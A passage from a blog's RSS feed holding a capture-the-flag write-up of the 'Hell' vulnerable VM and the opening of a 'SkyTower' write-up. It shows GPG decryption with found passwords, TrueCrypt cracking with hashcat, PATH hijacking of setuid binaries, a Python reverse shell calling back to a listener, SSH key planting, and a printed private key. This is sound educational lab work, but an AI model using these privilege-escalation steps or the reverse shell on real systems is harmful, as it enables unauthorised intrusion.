MWXhiYbZSRyHq7gaYRKS6kzG6uLlsyq4YnQzhz8M+sm4dePDBvs7U6yAPJf4oAAH
9o01Fp3IJ1isvVMH5Fr8MwQjOAuo6Yh6TwbOrI/MVpphJQja8gDKVYr2tlqNS5me
V8xJ7ZUxsh67w/5s5s1JgEDQt+f4wckBc8Dx5k9SbS9iRUbZ0oLJ3IM8cUj3CDoo
svsh0u4ZWj4SrLsEdErcNX6gGihRl/xs3qdVOpXtesSvxEQcWHLqtMY94tb29faD
+oQPjG3V4cSY5r566esUAlCn7ooYyx6Dug==
=svWU
-----END PGP MESSAGE-----
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I loaded the private GPG key into jacks keyring with:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ gpg --import .pgp/pgp.priv
gpg: keyring `/home/jack/.gnupg/secring.gpg&#39; created
gpg: key 3F18AB0A: secret key imported
gpg: key 3F18AB0A: public key &amp;quot;jack@cowlovers.com&amp;quot; imported
gpg: Total number processed: 1
gpg:               imported: 1  (RSA: 1)
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ofc this doesn’t mean I can actually use it yet, however there was a note about the password, so I could possibly just try all the ones I have found so far for jack. Decrypting the encrypted message we found for jack was as simple as:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ gpg /var/mail/jack/received/message.eml

You need a passphrase to unlock the secret key for
user: &amp;quot;jack@cowlovers.com&amp;quot;

# used the password g0tmi1k69 found in the MySQL database

2048-bit RSA key, ID 3F18AB0A, created 2014-06-18

gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 2048-bit RSA key, ID 3F18AB0A, created 2014-06-18
      &amp;quot;jack@cowlovers.com&amp;quot;
gpg: /var/mail/jack/received/message.eml: unknown suffix
Enter new filename [text.txt]:
gpg: WARNING: message was not integrity protected

$ cat text.txt
Ok Jack. I&#39;ve created the account &#39;milk_4_life&#39; as per your request. Please stop emailing me about this now or I&#39;m going to talk to HR like we discussed.

The password is &#39;4J0WWvL5nS&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So, lets ssh in as &lt;code&gt;milk_4_life&lt;/code&gt;&amp;hellip;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# ssh milk_4_life@192.168.56.102
milk_4_life@192.168.56.102&#39;s password:
Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
$ id
uid=1002(milk_4_life) gid=1002(milk_4_life) groups=1002(milk_4_life)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Easy :D&lt;/p&gt;

&lt;h2 id=&#34;becoming-george&#34;&gt;becoming george&lt;/h2&gt;

&lt;p&gt;The user &lt;code&gt;milk_4_life&lt;/code&gt; has a &lt;code&gt;game&lt;/code&gt; in hes home folder.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ ls -lah game
---s--x--x 1 george george 5.7K Jun 19 18:24 game

$ ./game
I&#39;m listening
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Not a very interesting game thus far. I decided to quit and rerun the game, this time backgrounding it with &lt;code&gt;&amp;amp;&lt;/code&gt;. At this stage I wanted to run a netstat to see if it is &lt;em&gt;listening&lt;/em&gt; on a port or something, but the netstat command was not available. I figured I could cause a error as the same port can not be opened twice. So, with &lt;code&gt;./game &amp;amp;&lt;/code&gt; already running, another instance of &lt;code&gt;./game&lt;/code&gt; errored out, revealing the listening port:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ ./game &amp;amp;
I&#39;m listening

$ ./game
Traceback (most recent call last):
  File &amp;quot;/usr/bin/game.py&amp;quot;, line 58, in &amp;lt;module&amp;gt;
    tcpSocket.bind((&amp;quot;0.0.0.0&amp;quot;, 1337))
  File &amp;quot;/usr/lib/python2.7/socket.py&amp;quot;, line 224, in meth
    return getattr(self._sock,name)(*args)
socket.error: [Errno 98] Address already in use
Lol nope
$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;tcp/1337 it is. Lets telnet to this:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;milk_4_life@hell:~$ telnet 127.0.0.1 1337
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is &#39;^]&#39;.
Type &#39;START&#39; to begin

START
Starting...

You have 30 seconds to get as many points as you can, beat the high score! (High Score: 133723)

Quick what&#39;s... 397 x 358? 1
Quick what&#39;s... 498 x 111? 2
Quick what&#39;s... 740 x 772?
Final Score: 0

Connection closed by foreign host.
milk_4_life@hell:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Typing anything other than &lt;code&gt;START&lt;/code&gt; would simply cause the script to die. Typing a non integer as a answer causes a loop, and that is about it.
Sooo, time to win this game and see what would happen. I decided to attempt this with a python script. The general idea would be to read the socket output, calculate the answer and send that back. This resulted in a script as follows (yeah I know its not perfect but gets the job done):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/python
import socket, sys

# start a socket
sock = socket.socket()
# connect locally
sock.connect((&#39;127.0.0.1&#39;, 1337))
ret = sock.recv(1024)   # read 1024 bytes
print &#39;[I] %s&#39; % ret.strip()
# start the game
print &#39;[O] START&#39;
sock.send(&#39;START\n&#39;) # START the game
ret = sock.recv(1024)   # read 1024 bytes
print &#39;[I] %s&#39; % ret.strip()

# Start reading the socket input and calculating answers sending them back
while True:
   ret = sock.recv(1024)
   print &#39;[I] %s&#39; % ret.strip()

   # split by spaces
   ret = ret.split(&#39; &#39;)

   # a question line
   if ret[0] == &#39;Quick&#39;:
      # extract the 2 integers from:
      # [&#39;Quick&#39;, &amp;quot;what&#39;s...&amp;quot;, &#39;435&#39;, &#39;x&#39;, &#39;574?&#39;, &#39;&#39;]
      one = int(ret[2])
      two = int(ret[4].replace(&#39;?&#39;,&#39;&#39;))   # remove the comma
      answer = one * two
      print &#39;[O] Answer %s&#39; % answer
      sock.send(str(answer) + &#39;\n&#39;)

   # once the 30 seconds passes, a line with Final will return. This
   # is the end of the game
   elif ret[0] == &#39;Final&#39;:
      print &#39;Done?&#39;
      sock.close()
      sys.exit(0)

   # if we dont know what to do, just &#39;press enter&#39;
   else:
      sock.send(&#39;\n&#39;)
sock.close()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I ran this in another session with &lt;code&gt;./game&lt;/code&gt; running and won :P Once you win, the output results in:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;!*!*!*!*! Congratulations, new high score (302785) !*!*!*!*!

I hear the faint sound of chmodding.......
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&amp;hellip; and ends. Heh, ok. Well that was probably not exactly what I hoped for, but nonetheless, the chmodding is at least a hint. The first thing that came to mind is a important file that was previously not available now possibly is as its been chmodded by &lt;code&gt;george&lt;/code&gt; after winning the game. Or, if it is in fact a chmod that is being run, is it being called via a system command from its full path (/usr/bin/chmod), or just via chmod?&lt;/p&gt;

&lt;p&gt;To test, I fired up another editor on &lt;code&gt;chmod.py&lt;/code&gt; and just put a line to echo test. I &lt;code&gt;chmod +x&lt;/code&gt; this and moved the file to &lt;code&gt;/tmp&lt;/code&gt;. I then added &lt;code&gt;/tmp&lt;/code&gt; to &lt;code&gt;PATH&lt;/code&gt; via &lt;code&gt;export PATH=/tmp:$PATH&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;milk_4_life@hell:~$ python chmod.py          # test the script
Testing chmod exec
milk_4_life@hell:~$ cp chmod.py /tmp/chmod   # copy it to /tmp
milk_4_life@hell:~$ chmod +x /tmp/chmod      # make it executable
milk_4_life@hell:~$ /tmp/chmod               # test it
Testing chmod exec
milk_4_life@hell:~$ export PATH=/tmp:$PATH   # prefix PATH with /tmp
milk_4_life@hell:~$ chmod                    # test it without full path
Testing chmod exec
milk_4_life@hell:~$ ./game                   # start the game
I&#39;m listening
Testing chmod exec                           # profit :)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;With it confirmed that &lt;code&gt;chmod&lt;/code&gt; was not called from its full path once you win the game (using our previously mentioned winning script :D), it was time to edit our &lt;code&gt;chmod&lt;/code&gt; script to be slightly more useful:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/python
import pty
pty.spawn(&#39;/bin/sh&#39;)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;With this now in /tmp/chmod, I reran &lt;code&gt;./game.py&lt;/code&gt;, and then &lt;code&gt;./play_game.py&lt;/code&gt;. After 30 seconds on the session we started the game we had:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;milk_4_life@hell:~$ ./game
I&#39;m listening
$ id
uid=1002(milk_4_life) gid=1002(milk_4_life) euid=1000(george) groups=1000(george),1002(milk_4_life)
$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Profit! We now have access to &lt;code&gt;george&lt;/code&gt;&amp;rsquo;s home directory :) In order to make the next steps easier, I quickly generated a new ssh key pair using &lt;code&gt;ssh-keygen&lt;/code&gt;, and added the contents of the resultant &lt;code&gt;id_rsa.pub&lt;/code&gt; to &lt;code&gt;.ssh/authorized_keys&lt;/code&gt;. Whats important to note in the below snippet is that the full path of &lt;code&gt;chmod&lt;/code&gt; is used. If we don’t, we will be hitting the chmod we just fooled to get to this shell in the first place :D&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ id
uid=1002(milk_4_life) gid=1002(milk_4_life) euid=1000(george) groups=1000(george),1002(milk_4_life)
$ cd /home/george
$ mkdir .ssh
$ /bin/chmod 755 .ssh
$ cd .ssh
$ echo &amp;quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3KB7V05tHJAWFavTgTK1dDIcUUVyUpZA3TYQhydNjeexWDeVzPNUGCo3/XZNgqw0QpaoX5eLm9k9OqxNyr7x5B6Rq2F7ykA0DHglbM4DLJDQRawHgoCzTwxBWAMva3HUbahounJFe9fOaECGZEsCmTF1462wTuZ/SYOO9lSHv38cO8b9nC5lteBz2An34+W/n9X1sxBAlDAHyXmAqJYpoE+gur+YX8j3WPNJbiBu3nVnvpDaR1BnvN1n74/yUtLYziT5Gt7lgRWiaDhzslR+46xbu/YmCyO03ztHhD/lD2JAcoEe43FKFUdh8ZGfBqCq0CbBB86KHhhLzV6QjLHjV root@kali&amp;quot; &amp;gt; authorized_keys
$ /bin/chmod 600 authorized_keys
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now we can SSH into the VM as &lt;code&gt;george&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# ssh george@192.168.56.102 -i id_rsa
Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
No mail.
Last login: Sat Jul  5 19:26:25 2014
george@hell:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;becoming-bazza&#34;&gt;becoming bazza&lt;/h2&gt;

&lt;p&gt;George&amp;rsquo;s home directory had what looked like a TrueCrypt container &lt;code&gt;4.0M Jun 19 21:09 container.tc&lt;/code&gt; in hes home directory. TrueCrypt appeared to be installed on the VM, and attempting to mount the container failed due to an invalid keyfile and or password.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;george&lt;/code&gt; also had mail in &lt;code&gt;/var/mail&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;george@hell:~$ cat /var/mail/george/signup.eml
From: admin@rockyou.com
To: super_admin@hell.com
Subject: Account Activation
Date: 13th November 2009

Thanks for signing up for your account. I hope you enjoy our services.
george@hell:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;There is a mention of &lt;em&gt;rockyou&lt;/em&gt; in the From address. There is a famous rockyou wordlist used for password cracking out in the wild. With that in mind, and the fact that it was 0430 already, I decided to copy the &lt;code&gt;container.tc&lt;/code&gt; to my Kali Linux install, and have &lt;code&gt;truecrack&lt;/code&gt; have a go at it while I catch up on some much deserved sleep.&lt;/p&gt;

&lt;h3 id=&#34;fast-forward-a-few-hours&#34;&gt;fast forward a few hours&lt;/h3&gt;

&lt;p&gt;A few hours passed, with 0 luck on cracking the password for the container. I started to realize that this &lt;em&gt;may&lt;/em&gt; not be the correct path in getting the container open, assuming that is the next step. However, as a last resort, I opted to copy the files onto my Windows gaming PC and run it via a GPU cracker, &lt;a href=&#34;http://hashcat.net/oclhashcat/&#34;&gt;oclHashcat&lt;/a&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;C:\Users\Somedude\Downloads\oclHashcat-1.21\oclHashcat-1.21&amp;gt;oclHashcat64.exe
-m 6211 C:\Users\Somedude\Desktop\Hell\container.tc C:\Users\Somedude\Desktop\Hell\rockyou.txt

[snip]

C:\Users\Somedude\Desktop\Hell\container.tc:letsyouupdateyourfunnotesandmore

Session.Name...: oclHashcat
Status.........: Cracked
Input.Mode.....: File (C:\Users\Somedude\Desktop\Hell\rockyou.txt)
Hash.Target....: File (C:\Users\Somedude\Desktop\Hell\container.tc)
Hash.Type......: TrueCrypt 5.0+ PBKDF2-HMAC-RipeMD160 + AES
Time.Started...: Sun Jul 20 14:26:08 2014 (19 secs)
Speed.GPU.#1...:    14578 H/s
Speed.GPU.#2...:    16165 H/s
Speed.GPU.#*...:    30743 H/s
Recovered......: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.......: 563201/14343297 (3.93%)
Skipped........: 0/563201 (0.00%)
Rejected.......: 1/563201 (0.00%)
HWMon.GPU.#1...: 64% Util, 54c Temp, 43% Fan
HWMon.GPU.#2...:  0% Util, 90c Temp, 100% Fan

Started: Sun Jul 20 14:26:08 2014
Stopped: Sun Jul 20 14:26:42 2014
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;About 19 seconds later, we have the password thanks to hashcat!&lt;/p&gt;

&lt;p&gt;So, lets mount the container and see whats inside:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;george@hell:~$ truecrypt container.tc
Enter mount directory [default]:
Enter password for /home/george/container.tc: letsyouupdateyourfunnotesandmore
Enter keyfile [none]:
Protect hidden volume (if any)? (y=Yes/n=No) [No]:

george@hell:~$ cd /media/truecrypt1/
george@hell:/media/truecrypt1$ ls -lah
total 22K
drwx------ 2 george george  16K Jan  1  1970 .
drwxr-xr-x 4 root   root   4.0K Jul 21 18:50 ..
-rwx------ 1 george george 1.7K Jul  5 20:01 id_rsa
george@hell:/media/truecrypt1$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAxlCbg0ln2dqRO3iIXPUvK3irg/9l5uvBAQdXTVmcm/JWN9OA
25XtZX8LOfiJtc+8OYXgD6lXNVPh9BjElq6qpR7fk1TaXXUlyiSlwCxz68n/cpYs
f6UUa9QXm0LSHD8m7g/e5qqIm8bb15TIC6+8TmSB11FE9NLPN+8hVyP1S9EBntom
t5watKDFUNF+mcl14Tj+INcWB2qpEPgZ1mIwq1Zw3w/vy27y0i1r52+fot1vgf2K
Ymo6GipsdxW1k/UuCjJEE6e0GZFA8vhpH5F4MG8k33vIPqkxgEgF0GX8RPAQF/Xf
gxERhkGP+hVOd8b11OXzxWGGQyqwOYF8+7qVjwIDAQABAoIBAQCyldpFUvBDXbEV
dgiOdXkh04vY1UBlv/3ROFQk4sLGKGf94+gRViUvFkX80VTptgWRY36Pe/Z9nmlG
0JsP+oDPK0s4uNvf92Otcm0U7rMBLals/dFarUUDiT4s4fKl3zTmgsI+xGk6psxI
icHPzFRt39KRHK1VLxXOD/jdKRN3Tk0odH1kNahOuFC2F5T+aqdlC/RAGwxnTDBe
AFPFlns83GaPYlIt05DZsdGftG7mITkNfUVS5AIyeedshU4OyPXu5bGgUgbtars4
GdttJ33Tm5hO+n3E93sW7XMKG4v4po+1Fu0OwNQNpaRo6gVqK7AZHNPxBRW7K4Zc
w2d0EXehAoGBAOQgtqb5QVyhiCdT53xjZTMHH74ApWRpsoLtu/LaZnQV0v/dzEIv
jei58v/PusXsSwOQeb4p2obOReQFbYG48vCiywwMbeOeqH2d69HYatHmxPXngKS3
6trus/pHuDJosFw1qhgVo9ao0o8IH6cveHidmwvzKfiphgM3yCXF9jyxAoGBAN6L
awHXmHQCsCq//UbHbfuaBScJOpaagKP1BIskl5RDaQ/U/DzSpxju0ldedX7HYVFW
Rk6NQQ6QiXIC/5D7Xj+tcR2EFI+Tt9xp6dE/UlxpUL1h9QCBfmdw0CT9WSwJEGF7
R+D18trKcb/NkYdJV8ZpaT00rLzyBx5MY/FZbYY/AoGBALrCwWXfR5BjOckgmrGt
2cq1uVnew4h6M8eWgzklbZz5xPzuAuvobKAro3GkCb9BXIQ1gkWZlCqqsnMjsmvy
EwnH7L0Xa9teJ4h3gfkQ2Rqwd2ztstanLyE/LJ7omjbCmCdVU8RV6wSwv3iTaP6B
EXqFZMqarzDA8FKwFy49bAJxAoGBALkXBYG7uW1LSw/TLCjw9zVaTUzBLTxS9gjn
YMcFQRir1Da5sqw3m4huIP1Pb7NoyjTm54SvkNs3NUlg2wPPPP0DGOAumRctCa9F
W5WP78UyRlesoCOyj9oihsss9zxbsYcSDJ86j6iO1Xpr08zMIDfCNigUplJjja4S
ZNE3ypLrAoGAbp+vBcqQRfnXWfmcdnHYFbwgWbokPSe2fScajWiyvcg4/6gL1e50
rpO3RTOREUD02pBbyG4LDFv7x/5niqASL0tS8/0xWDBDj5QmD9UTmMd5hsMbj8Lw
qJA0ErZEjIE9+jXYLbsTsB8tRTsqMqBfCCovHXAjy0h5B6j500PfImM=
-----END RSA PRIVATE KEY-----
george@hell:/media/truecrypt1$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So, a rsa private key. A wild shot in the dark sais this is the private key for one of the other users as per the &lt;code&gt;/etc/passwd&lt;/code&gt;. I saved the key to a file on my Kali Linux box and attempted to SSH in as &lt;code&gt;bazza&lt;/code&gt;, specifying the private key to use:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# ssh bazza@192.168.56.102 -i truecrypt_id_rsa
Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Jul 21 18:52:50 2014 from 192.168.56.1
$ id
uid=1004(bazza) gid=1004(bazza) groups=1004(bazza)
$
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;becoming-oj&#34;&gt;becoming oj&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;bazza&lt;/code&gt; had 2 interesting files in hes home directory:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;bazza@hell:~$ ls -lh
total 20K
-rw-r--r-- 1 root root        109 Jul  6 18:32 barrebas.txt
-r-xr-sr-x 1 oj   developers 6.1K Jul  6 18:39 part1
-r-sr-xr-x 1 oj   oj         5.2K Jul  6 18:34 part2
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The &lt;code&gt;barrebas.txt&lt;/code&gt; looks to be a shoutout to the tester of the vulns. &lt;code&gt;part1&lt;/code&gt; &amp;amp; &lt;code&gt;part2&lt;/code&gt; from first glance had interesting permissions, and made it relatively easy to determine that the next user we should be after this is &lt;code&gt;oj&lt;/code&gt;. Running &lt;code&gt;part1&lt;/code&gt; and &lt;code&gt;part2&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;bazza@hell:~$ ./part1
Checking integrity of part2... Done!!

Checking integrity of calling target... Done!!

Binary and target confirmed.

Can&#39;t touch this *nah na na na na naaaaaaaa nah*
uid=1004(bazza) gid=1004(bazza) euid=1005(oj) egid=1003(developers) groups=1005(oj),1004(bazza)

bazza@hell:~$ ./part2


Error! 1004 ID detected ... youre not allowed to run this, please use part 1!
bazza@hell:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So it seems that part2 is protected apparently due to the fact that our uid (or groupid?) of 1004 was not allowed. Slightly cryptic, but a few thoughts about what the binaries are doing were already going about. &lt;code&gt;part1&lt;/code&gt; outputs what looks like the output of the &lt;code&gt;id&lt;/code&gt; command too.&lt;/p&gt;

&lt;p&gt;Again, this part took some time and resulted in a rabbit-hole scenario of try something, google something, try something, google something. I am not going to go through everything I have tried for this part, but simply try depict how I managed to figure this out in the end.&lt;/p&gt;

&lt;p&gt;We start with a &lt;code&gt;strings&lt;/code&gt; of &lt;code&gt;part1&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;bazza@hell:~$ strings part1
/lib/ld-linux.so.2
__gmon_start__
libc.so.6
_IO_stdin_used
puts
popen
printf
fgets
system
pclose
strcmp
__libc_start_main
GLIBC_2.1
GLIBC_2.0
PTRh
QVhl
[^_]
900462fbf9593f1a4b753f1729c431abc80932a151e9b293e13822a91f9641c1  /home/bazza/part2
1003a011c5bdb65a07a8f92feb6b7d7ecbf3a3ff0f2a46abbe5c777c525996d8  /usr/bin/id
Checking integrity of part2...
sha256sum /home/bazza/part2
Failed to run command
 Done!!
Checking integrity of calling target...
sha256sum /usr/bin/id
Uh oh.... Corrupted or in wrong directory (/home/bazza/)
 Done!!
Binary and target confirmed.
/home/bazza/part2
Target corrupt
;*2$&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This should give you a pretty good idea of what is potentially going on in the binary, like:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Check the sha256sum of /gome/bazza/part matches 900462fbf9593f1a4b753f1729c431abc80932a151e9b293e13822a91f9641c1&lt;/li&gt;
&lt;li&gt;Check the sha256sum of /usr/bin/id matches 1003a011c5bdb65a07a8f92feb6b7d7ecbf3a3ff0f2a46abbe5c777c525996d8&lt;/li&gt;
&lt;li&gt;Eventually Fail if these don’t match.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The key lies in the fact that the &lt;code&gt;sha256sum&lt;/code&gt; command does not appear to be called from its full path location ie: /usr/bin/sha256sum. So, similar to how we fooled the &lt;code&gt;chmod&lt;/code&gt; earlier, we are going to do exactly the same with the &lt;code&gt;sha256sum&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;As before, we create a &lt;em&gt;evil sha256sum&lt;/em&gt; command, which is actually just a python script to spawn &lt;code&gt;/bin/sh&lt;/code&gt;, then prefix &lt;code&gt;PATH&lt;/code&gt; with &lt;code&gt;/tmp&lt;/code&gt; and run &lt;code&gt;./part1&lt;/code&gt;. For this one however, I was having trouble with the pty.spawn() and didn&amp;rsquo;t really feel like troubleshooting that much. So I opted for a (reverse shell)[&lt;a href=&#34;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&#34;&gt;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&lt;/a&gt;] payload instead to open on a netcat listener that I have on my host laptop:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/python
import socket,subprocess,os

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((&amp;quot;192.168.56.1&amp;quot;,4444))

os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)

p = subprocess.call([&amp;quot;/bin/sh&amp;quot;,&amp;quot;-i&amp;quot;])
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I spawned a &lt;code&gt;netcat&lt;/code&gt; listener on my laptop using &lt;code&gt;nc -l 4444&lt;/code&gt;, and ran &lt;code&gt;./part1&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;→ nc -l 4444
$ id
uid=1004(bazza) gid=1004(bazza) egid=1003(developers) groups=1004(bazza)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Notice that I was now in the &lt;code&gt;developers&lt;/code&gt; group. I was now allowed to run &lt;code&gt;./part2&lt;/code&gt; too&amp;hellip; with a verbose line showing me the permissions I would need to gain access to &lt;code&gt;/home/oj&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ ./part2
uid=1004(bazza) gid=1004(bazza) euid=1005(oj) egid=1003(developers) groups=1005(oj),1004(bazza)

Can&#39;t touch this *nah na na na na naaaaaaaa nah*
$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And, as expected, I spent some time on this binary too. I didn&amp;rsquo;t expect &lt;code&gt;part2&lt;/code&gt; to be any easier :P
After taking a break, I realized that the output that looks like that of &lt;code&gt;/usr/bin/id&lt;/code&gt;, probably &lt;strong&gt;is&lt;/strong&gt; that if it. So, off I went and did another &lt;code&gt;sha256sum&lt;/code&gt;, type script, this time just with another reverse shell to port 4445, and naming it &lt;code&gt;id&lt;/code&gt; so that part2 will pick it up:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;→ nc -l 4445
$ /usr/bin/id
uid=1004(bazza) gid=1004(bazza) euid=1005(oj) egid=1003(developers) groups=1005(oj),1004(bazza)

$ cd /home/oj
$ ls -lh
total 584K
-r-sr-xr-x 1 root root 579K Jul  5 21:12 echo
-rw-r--r-- 1 root root  154 Jul  5 21:06 How to be an infosec rockstar 101.txt
$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And there we are! Group membership for &lt;code&gt;oj&lt;/code&gt;, and access to &lt;code&gt;/home/oj&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&#34;becoming-root&#34;&gt;becoming root&lt;/h2&gt;

&lt;p&gt;As with all of the other users, I added myself a ssh key for easy access.&lt;/p&gt;

&lt;p&gt;Now, sadly I have to admit that this is as far as I have been able to come. &lt;code&gt;oj&lt;/code&gt; has a binary called &lt;code&gt;echo&lt;/code&gt; (not to be confused with the builtin echo), that, as expected, will echo what you input.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;oj@hell:~$ ./echo onetwothree
onetwothree
oj@hell:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I toyed with the inputs and noticed that when I entered inputs prefixed with a %, some strange stuff started to happen. Google helped me towards learning that this is what is called a &lt;a href=&#34;https://www.owasp.org/index.php/Format_string_attack&#34;&gt;Format String Attack&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;oj@hell:~$ ./echo %08x.%08x.%08x
080488c0.bffffcf8.00000000
oj@hell:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I am however satisfied that I have come this far, and will definitely endeavor to nail this format string vuln sometime. But that time is not now.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Edit:&lt;/strong&gt; One way to root the machine is to make use of the fact that you can run &lt;code&gt;truecrypt&lt;/code&gt; as &lt;code&gt;root&lt;/code&gt;, and provide a evil container, spawning you a &lt;code&gt;root&lt;/code&gt; shell. An example of this can be seen &lt;a href=&#34;http://vinicius777.github.io/blog/2014/07/14/truecrypt-privilege-escalation/&#34;&gt;here&lt;/a&gt; (and actually references this VM)&lt;/p&gt;

&lt;h2 id=&#34;summary&#34;&gt;summary&lt;/h2&gt;

&lt;p&gt;Hell sure as heck taught me a lot and was one fun experience! Shoutout to &lt;a href=&#34;https://twitter.com/@0x42424242&#34;&gt;@0x42424242&lt;/a&gt; for the time taken to make this VM available.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Climbing the SkyTower</title>
      <link>https://leonjza.github.io/blog/2014/07/17/climbing-the-skytower/</link>
      <pubDate>Thu, 17 Jul 2014 18:20:12 +0000</pubDate>
      
      <guid>https://leonjza.github.io/blog/2014/07/17/climbing-the-skytower/</guid>
      <description>

&lt;h2 id=&#34;foreword&#34;&gt;foreword&lt;/h2&gt;

&lt;p&gt;Recently, at a local Security Conference, &lt;a href=&#34;https://twitter.com/telspacesystems&#34;&gt;@telspacesystems&lt;/a&gt; ran a CTF. It was a classic &amp;lsquo;read /root/flag.txt&amp;rsquo; CTF hosted on a wireless network. Sadly the wifi sucked, a lot, and due to this and a flat battery I was not able to attempt this CTF properly at the con. Nonetheless, the VM was released on &lt;a href=&#34;http://vulnhub.com/entry/skytower-1,96/&#34;&gt;VulnHub&lt;/a&gt;, and was promptly downloaded and loaded into VirtualBox.&lt;/p&gt;

&lt;p&gt;In summary, this CTF taught me some interesting things about SQL injection where filters are present. More specifically, commas were filtered out and resulted in the need from some creative thinking :)&lt;/p&gt;

&lt;h2 id=&#34;starting-off&#34;&gt;starting off&lt;/h2&gt;

&lt;p&gt;The very first thing to do was get the IP assigned by my home router to the VM. Loaded this up into a web browser and saw the skytower web page as per the screenshots in the vulnhub entry. The IP I got was 192.168.137.242.&lt;/p&gt;

